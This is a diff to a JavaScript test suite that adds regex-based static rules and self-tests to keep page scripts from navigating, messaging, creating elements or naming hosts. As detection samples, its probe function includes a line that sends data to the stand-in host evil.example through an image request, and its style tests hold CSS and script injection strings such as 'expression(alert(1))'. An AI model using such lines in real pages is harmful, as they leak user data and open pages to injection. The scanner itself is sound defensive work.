@@ -14,6 +14,14 @@
 //       "all"   every character, comments included (the storage names, which are never written at all: copy
 //               and comments say "browser storage").
 //     An HTML file has no "code" view: it may not hold script at all (rule 2).
+//     The scripts of the two page folders and the three cores also keep the rules of SCRIPT_RULES (section 1.5
+//     of the specification: the DOM is built through the kit's h(), links come from the kit's LINKS, nothing
+//     leaves the page): no element made outside the kit; no setAttribute but with a literal aria- or data-
+//     name; no href, src, style text, class name or id assigned; no assignment to location and no navigation
+//     through it; no window.open; no message listener, postMessage or message channel; no timer whose first
+//     argument is not a function written in place; no worker; the clipboard only in the sky page's one copy
+//     button; no host named in a string. The kit is where elements are made and attributes are set, so it
+//     keeps only the rules marked `kit`.
 //  2. Each index.html (and any other .html in a page folder): the content policy line is the first element of
 //     the head, letter for letter; no attribute whose name begins with "on"; exactly one script element, and it
 //     is a module with a relative src and no text; no host anywhere in the file but the two font hosts, over
@@ -122,6 +130,75 @@ const FORBIDDEN = [
   { name: "a function named escapeHTML", where: "code", re: ident("escapeHTML"), sample: "const escapeHTML = (s) => s;" },
   { name: "a function named jsArg", where: "code", re: ident("jsArg"), sample: "const jsArg = (s) => s;" },
 ];
+
+// The page-script rules. They are read on the scripts of the two page folders and on the three cores, and those
+// marked `kit` on the kit as well. `start: true` means a match must begin in program text; the expression may
+// then read on into a string (the name of an attribute, the first argument of a timer). `allow` names a file
+// and how many matches it may hold. `sound` are lines next to the rule that must not be caught.
+const SKY_SHELL = `${WING}/Celestial_Control_Panel/celestial-control-panel.js`;
+const assigned = "(?:=(?![=>])|[-+*/%&|^]=)";   // an assignment, not ==, === or =>
+const SCRIPT_RULES = [
+  { name: "an element made outside the kit", where: "code",
+    re: /(?<![\w$])createElement(?:NS)?(?![\w$])|(?<![\w$])new\s+(?:Image|Audio|Option)(?![\w$])/,
+    sample: 'const a = document.createElement("a");',
+    sound: ['const p = h("p", { class: "note" }, "made by the kit");', "const image = newImage(), created = createElements(2);"] },
+  { name: "setAttribute with a name that is not an aria- or data- literal", where: "text", start: true,
+    re: /\.\s*setAttribute(?:NS)?\s*\((?!\s*(["'])(?:aria|data)-[a-z0-9-]+\1\s*,)/,
+    sample: 'a.setAttribute("href", u);',
+    sound: ['b.setAttribute("aria-pressed", String(on)); $("say").setAttribute("data-station", key);', "b.setAttribute('aria-label', label); b.removeAttribute(\"aria-disabled\"); const v = b.getAttribute(\"data-view\");"] },
+  { name: "href, src or action assigned outside the kit", where: "code",
+    re: new RegExp(`\\.\\s*(?:href|src|srcset|action|formAction)\\s*${assigned}`),
+    sample: "a.href = u;",
+    sound: ['const link = h("a", { href: x.href }, x.name); if (x.href === y.href || a.src == b.src) go();', "const url = location.href.split(\"#\")[0] + href.slice(1); const f = (x) => x.href => 1;"] },
+  { name: "style text, a class name or an id assigned outside the kit", where: "code",
+    re: new RegExp(`\\.\\s*(?:cssText|className|id)\\s*${assigned}|\\.\\s*style\\s*=(?![=>])`),
+    sample: "a.className = s;",
+    sound: ['canvas.style.width = w.toFixed(0) + "px"; box.classList.toggle("many", n > 4); box.hidden = !show;', "if (row.id === id || el.className == name) return { id: row.id, style: 1 };"] },
+  { name: "location assigned or navigated", where: "code", kit: true,
+    re: new RegExp(`(?:(?<![\\w$.])|(?<![\\w$])(?:window|document|self|top|parent|globalThis)\\s*\\.\\s*)location\\s*(?:${assigned}|\\.\\s*(?:assign|replace|reload)\\s*\\(|\\.\\s*(?:href|pathname|search|host|hostname|port|protocol|origin)\\s*${assigned})`),
+    sample: "location.assign(u);",
+    sound: ['const a = location.hash, b = location.href.split("#")[0]; if (location.hash === a) history.replaceState(null, "", a);', 'history.pushState(null, "", next); const s = text.replace(/a/g, "b"), r = Object.assign({}, a); place.location = "here";'] },
+  { name: "window.open", where: "code",
+    re: /(?<![\w$])(?:window|self|top|parent|globalThis)\s*\.\s*open\s*\(|(?<![\w$.])open\s*\(/,
+    sample: "window.open(u);",
+    sound: ["dialogs.about.open(button); details.open = true; const opened = reopen(1);"] },
+  { name: "a message listener", where: "text", start: true, kit: true,
+    re: /(?<![\w$])addEventListener\s*\(\s*(["'`])message\1|(?<![\w$])onmessage(?![\w$])/,
+    sample: 'addEventListener("message", f);',
+    sound: ['window.addEventListener("hashchange", f); el.addEventListener("click", f); const message = "a message";'] },
+  { name: "postMessage or a message channel", where: "code", kit: true,
+    re: /(?<![\w$])postMessage(?![\w$])|(?<![\w$])(?:BroadcastChannel|MessageChannel)(?![\w$])/,
+    sample: 'parent.postMessage(s, "*");',
+    sound: ["const posted = postMessages(1);"] },
+  { name: "a timer whose first argument is not a function written in place", where: "text", start: true,
+    re: /(?<![\w$])set(?:Timeout|Interval)\s*\((?!\s*(?:async\s+)?(?:function(?![\w$])|\([^()]*\)\s*=>|[A-Za-z_$][\w$]*\s*=>))/,
+    sample: 'setTimeout("go()", 0);',
+    sound: ["const t = setTimeout(() => go(), 100), u = setInterval(function () { go(); }, 1000), v = setTimeout(async (x) => go(x), 0); clearTimeout(t);", "window.setTimeout(x => go(x), 5); requestAnimationFrame(step);"] },
+  { name: "a worker", where: "code", kit: true,
+    re: /(?<![\w$])new\s+(?:Shared)?Worker(?![\w$])|(?<![\w$])(?:serviceWorker|importScripts)(?![\w$])/,
+    sample: "const w = new Worker(u);",
+    sound: ["const worker = newWorker(), Workers = 2;"] },
+  { name: "the clipboard read, or written with anything but writeText", where: "code", kit: true,
+    re: /(?<![\w$])clipboard\s*\.\s*(?:read|readText|write)\s*\(|(?<![\w$])execCommand(?![\w$])/,
+    sample: "const t = await navigator.clipboard.readText();",
+    sound: ["const clipboards = 1;"] },
+  { name: "the clipboard outside the sky page's one copy button", where: "code", kit: true, allow: { [SKY_SHELL]: 1 },
+    re: /(?<![\w$])clipboard(?![\w$])(?!\s*\.\s*(?:read|readText|write)\s*\()/,
+    sample: "navigator.clipboard.writeText(s);",
+    sound: ["const clipboards = 1;"] },
+  { name: "a host named in a script", where: "text", kit: true,
+    re: /[A-Za-z][A-Za-z0-9+.-]*:\/\/[^\s"'`<>()\\;,]*|(?<=["'`])\/\/[A-Za-z0-9-]+\.[A-Za-z0-9.-]*/,
+    sample: 'const u = "https://example.org/x";',
+    sound: ['const link = "../First_Explorers/index.html#lens=navigator", blob = "blob:", data = "data:,", r = /^https?:\\/\\//, half = n / 2 // 3;'] },
+];
+const isScript = (rel) => /\.(?:m?js|cjs)$/i.test(rel);
+// The rules a file keeps: FORBIDDEN everywhere; SCRIPT_RULES in a script of a page folder and in a core; in the
+// kit, the SCRIPT_RULES marked `kit`.
+function rulesFor(rel) {
+  if (!isScript(rel)) return FORBIDDEN;
+  if (rel === KIT) return [...FORBIDDEN, ...SCRIPT_RULES.filter((r) => r.kit)];
+  return pageOf(rel) || CORES.includes(rel) ? [...FORBIDDEN, ...SCRIPT_RULES] : FORBIDDEN;
+}
 
 // ---------------------------------------------------------------- files
 
@@ -323,14 +400,19 @@ function viewsOfHtml(src) {
 
 // ---------------------------------------------------------------- rule 1: forbidden names
 
-function forbiddenIn(path, src) {
+function forbiddenIn(path, src, rules = rulesFor(path)) {
   const views = /\.html?$/i.test(path) ? viewsOfHtml(src) : viewsOfJs(src);
   const out = [];
-  for (const rule of FORBIDDEN) {
+  for (const rule of rules) {
     const view = views[rule.where];
     if (view == null) continue;
     const re = new RegExp(rule.re.source, rule.re.flags.includes("g") ? rule.re.flags : rule.re.flags + "g");
-    for (const m of view.matchAll(re)) out.push(`${path}:${lineOf(src, m.index)}: ${rule.name} (found "${m[0].trim()}")`);
+    let allowed = (rule.allow && rule.allow[path]) || 0;
+    for (const m of view.matchAll(re)) {
+      if (rule.start && views.kind[m.index] !== CODE) continue;   // the words in a string or in template text
+      if (allowed-- > 0) continue;
+      out.push(`${path}:${lineOf(src, m.index)}: ${rule.name} (found "${m[0].trim()}")`);
+    }
   }
   return out;
 }
@@ -486,6 +568,9 @@ test("the lists name files of this repository", () => {
   for (const core of CORES) assert.ok(present(core), missingNote(core));
   assert.equal(new Set(LISTED).size, LISTED.length, "a file is listed twice");
   assert.equal(new Set(FORBIDDEN.map((r) => r.name)).size, FORBIDDEN.length, "a forbidden name is listed twice");
+  const every = [...FORBIDDEN, ...SCRIPT_RULES].map((r) => r.name);
+  assert.equal(new Set(every).size, every.length, "a rule is listed twice");
+  for (const rule of SCRIPT_RULES) for (const file of Object.keys(rule.allow || {})) assert.ok(present(file), `${rule.name}: the file it allows for does not exist: ${file}`);
 });
 
 for (const rel of [...LISTED, ...EXTRA]) {
@@ -529,6 +614,36 @@ test("the kit loads without a document, and every value of LINKS resolves to an 
   const { problems, pending } = linkProblems(kit.LINKS);
   assert.deepEqual(problems, [], report(problems));
   if (pending.length) t.skip(`the other targets exist; not written yet: ${pending.join(", ")}`);
+});
+
+test("the kit's style rule: text that could name a resource is refused in every spelling, and plain style text passes", async () => {
+  const kit = await import(pathToFileURL(abs(KIT)).href);
+  assert.equal(typeof kit.isAllowedStyleText, "function", "the kit exports isAllowedStyleText");
+  const B = "//example.org/x.png";
+  const refused = [
+    ["url(", `background:url(${B})`], ["url( in capitals", `background:URL(${B})`], ["url (", `background: url ("${B}")`],
+    ["an escaped u", `background:\\75rl(${B})`], ["an escaped r", `background:u\\72l(${B})`], ["an escaped l, six digits", `background:ur\\00006c(${B})`],
+    ["an escaped letter that needs no escape", `background:u\\rl(${B})`], ["a backslash and nothing else", "content:'\\'"],
+    ["image-set(", `background-image:image-set("${B}" 1x)`], ["image-set( in capitals", `background-image:IMAGE-SET("${B}" 1x)`],
+    ["-webkit-image-set(", `background-image:-webkit-image-set("${B}" 1x)`], ["image-set (", `background-image:image-set ("${B}" 1x)`],
+    ["image(", `background-image:image("${B}")`], ["src(", `background-image:src("${B}")`],
+    ["@import", `@import "${B}"`], ["expression(", "width:expression(alert(1))"], ["a script URL", "background:javascript:alert(1)"],
+    ["a cursor", `cursor:url(${B}), auto`], ["a list marker", `list-style:url(${B})`], ["a filter", "filter:url(#f)"],
+    // the values of a style object go through the same rule
+    ["a value: image-set", `image-set("${B}" 1x)`], ["a value: an escape", `\\75rl(${B})`],
+  ];
+  for (const [what, text] of refused) assert.equal(kit.isAllowedStyleText(text), false, what);
+  for (const x of [undefined, null, 5, true, {}, [], ["color:red"]]) assert.equal(kit.isAllowedStyleText(x), false, "only a string is style text");
+  const allowed = [
+    "", "color:red", "padding-left: 30px", "--c:#fbbf24", "margin-bottom:7px", "white-space:pre-wrap", "background-image: linear-gradient(90deg, #000, #fff)",
+    "transform: translate(3px, 4px) rotate(10deg)", "width: calc(100% - 2rem)", "color: var(--gold)", "font-family: Inter, sans-serif", "30px", "#94a3b8",
+    "background: rgb(0 0 0 / 50%)", "grid-template-columns: repeat(2, minmax(0, 1fr))", "content: 'an image, a source, a curl'",
+  ];
+  for (const text of allowed) assert.equal(kit.isAllowedStyleText(text), true, text);
+  // h() itself asks this rule, for the text form and for every value of the object form, and nothing else decides
+  const src = read(KIT), setStyle = src.slice(src.indexOf("function setStyle("), src.indexOf("function appendKids("));
+  assert.equal((setStyle.match(/isAllowedStyleText\(/g) || []).length, 2, "setStyle asks the rule for the text and for each value");
+  assert.ok(!/UNSAFE_STYLE/.test(setStyle), "and has no second rule of its own");
 });
 
 // ---------------------------------------------------------------- self-tests: every rule can fail
@@ -585,6 +700,80 @@ test("self-test: the scanner keeps its place after regular expressions, template
     "",
   ].join("\n");
   assert.deepEqual(forbiddenIn("x.js", tricky).map((p) => p.replace(/ \(found .*$/, "")), ["x.js:4: innerHTML", "x.js:6: eval", "x.js:5: fetch", "x.js:7: cookie"]);
+});
+
+// The page-script rules, on a script that would sit in a page folder.
+const IN_PAGE = `${PAGES[1].dir}/x.js`;
+
+test("self-test: every page-script rule is caught where it applies, told from comments and sentences, and passes the lines next to it", () => {
+  for (const rule of SCRIPT_RULES) {
+    const { name, where, start, sample, sound } = rule;
+    assert.deepEqual(names(forbiddenIn(IN_PAGE, `const a = 1;\n${sample}\n`)), [name], `${name}: not caught, or caught as something else`);
+    assert.match(forbiddenIn(IN_PAGE, `const a = 1;\n\n${sample}\n`)[0], /:3: /, `${name}: wrong line number`);
+    assert.deepEqual(forbiddenIn(IN_PAGE, `const a = 1; // ${sample}\n`), [], `${name}: a line comment is not code`);
+    assert.deepEqual(forbiddenIn(IN_PAGE, `/* ${sample}\n */\nconst a = 1;\n`), [], `${name}: a block comment is not code`);
+    const inString = forbiddenIn(IN_PAGE, `const a = ${JSON.stringify(sample)};\n`), inTemplate = forbiddenIn(IN_PAGE, "const a = `" + sample.replace(/[`$\\]/g, "") + "`;\n");
+    if (where === "code" || start) {
+      assert.deepEqual(inString, [], `${name}: a sentence in a string is not code`);
+      assert.deepEqual(inTemplate, [], `${name}: template text is not code`);
+      assert.equal(forbiddenIn(IN_PAGE, "const a = `${" + sample.replace(/;$/, "") + "}`;\n").length, 1, `${name}: the code inside \${...} is code`);
+    } else {
+      assert.equal(inString.length, 1, `${name}: must be caught inside a string too`);
+      assert.equal(inTemplate.length, 1, `${name}: must be caught inside a template too`);
+    }
+    assert.ok(Array.isArray(sound) && sound.length >= 1, `${name}: no line that must pass`);
+    assert.deepEqual(forbiddenIn(IN_PAGE, sound.join("\n") + "\n"), [], `${name}: a line next to the rule is caught`);
+    // where the rule applies: every script of a page folder and every core; the kit only when marked; nothing else
+    for (const rel of [`${PAGES[0].dir}/x.js`, `${PAGES[1].dir}/deeper/x.mjs`, ...CORES]) assert.deepEqual(names(forbiddenIn(rel, sample + "\n")), [name], `${name}: not caught in ${rel}`);
+    assert.deepEqual(names(forbiddenIn(KIT, sample + "\n")), rule.kit ? [name] : [], `${name}: the kit`);
+    assert.deepEqual(forbiddenIn("x.js", sample + "\n"), [], `${name}: a script outside the pages and the cores`);
+    assert.deepEqual(forbiddenIn(`${PAGES[0].dir}/p.html`, sample + "\n"), [], `${name}: a page file has no script to read`);
+  }
+});
+
+test("self-test: the page-script rules catch every line of a function that works round the kit", () => {
+  const probe = [
+    "function probe(fromLexicon) {",
+    "  const a = document.createElement(\"a\");",
+    "  a.setAttribute(\"href\", fromLexicon);",
+    "  a.href = fromLexicon;",
+    "  const s = document.createElement(\"script\");",
+    "  s.src = fromLexicon;",
+    "  location.href = fromLexicon;",
+    "  location.assign(fromLexicon);",
+    "  window.open(fromLexicon);",
+    "  setTimeout(\"alert(1)\", 0);",
+    "  setInterval(fromLexicon, 1000);",
+    "  addEventListener(\"message\", (e) => probe(e.data));",
+    "  parent.postMessage(fromLexicon, \"*\");",
+    "  navigator.clipboard.writeText(fromLexicon);",
+    "  new Worker(fromLexicon);",
+    "  a.setAttribute(\"onclick\", fromLexicon);",
+    "  a.setAttribute(name, fromLexicon);",
+    "  a.style.cssText = fromLexicon;",
+    "  a.className = fromLexicon; a.id = fromLexicon;",
+    "  new Image().src = \"https://evil.example/?\" + fromLexicon;",
+    "  window.location = fromLexicon; document.location.replace(fromLexicon); top.location.href += fromLexicon;",
+    "  const u = \"//evil.example/x\";",
+    "}",
+    "",
+  ].join("\n");
+  const caught = new Set(forbiddenIn(IN_PAGE, probe).map((p) => Number(/:(\d+): /.exec(p)[1])));
+  const lines = probe.split("\n").length - 1;
+  for (let n = 2; n < lines; n++) assert.ok(caught.has(n), `line ${n} of the probe is not caught: ${probe.split("\n")[n - 1].trim()}`);
+  assert.ok(!caught.has(1) && !caught.has(lines), "the function's own first and last line are sound");
+  assert.deepEqual(forbiddenIn("x.js", probe), [], "outside the pages only the forbidden names apply");
+});
+
+test("self-test: the clipboard is allowed once, in the sky page's shell, and only as writeText", () => {
+  const copy = "btn.onpress = () => { navigator.clipboard.writeText(url).then(done, failed); };\n";
+  assert.deepEqual(forbiddenIn(SKY_SHELL, copy), []);
+  assert.deepEqual(names(forbiddenIn(SKY_SHELL, copy + copy)), ["the clipboard outside the sky page's one copy button"], "a second use in the same file");
+  assert.equal(forbiddenIn(SKY_SHELL, copy + copy)[0].split(":")[1], "2", "and it is the second that is reported");
+  assert.equal(forbiddenIn(`${PAGES[1].dir}/lexicon-explorer.js`, copy).length, 1, "the other page has none");
+  assert.equal(forbiddenIn(`${PAGES[0].dir}/celestial-chart.js`, copy).length, 1, "nor has another script of the sky page");
+  assert.equal(forbiddenIn(KIT, copy).length, 1, "nor has the kit");
+  assert.deepEqual(names(forbiddenIn(SKY_SHELL, "const t = await navigator.clipboard.readText();\n")), ["the clipboard read, or written with anything but writeText"], "reading is never allowed");
 });
 
 test("self-test: forbidden names in a page file, outside its comments", () => {
